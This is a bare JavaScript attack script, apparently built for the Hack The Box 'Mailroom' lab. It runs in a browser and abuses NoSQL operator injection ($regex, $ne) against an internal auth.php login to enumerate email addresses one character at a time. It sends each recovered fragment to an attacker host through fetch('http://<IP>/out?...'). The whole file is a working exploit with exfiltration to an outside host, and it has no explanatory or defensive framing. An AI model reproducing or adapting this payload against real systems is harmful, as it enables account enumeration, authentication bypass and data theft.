async function callAuth(mail) {
    var http = new XMLHttpRequest();
    http.open('POST', "http://staff-review-panel.mailroom.htb/auth.php", true);
    http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    http.onload = function () {
        if (/"success":true/.test(this.responseText)) {
            notify(mail);
            cal("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%'()+, -/:;<=>@[\]_`{}~", mail);
        }
    };
    http.send("email[$regex]=.*" + mail + "@mailroom.htb&password[$ne]=abc");
}
function notify(mail) {
    fetch("http://<IP>/out?" + mail);
}
var chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%'()+, -/:;<=>@[\]_`{}~";
function cal(chars, mail) {
    for (var i = 0; i < chars.length; i++) {
        callAuth(chars[i] + mail)
    }
}
cal(chars, "");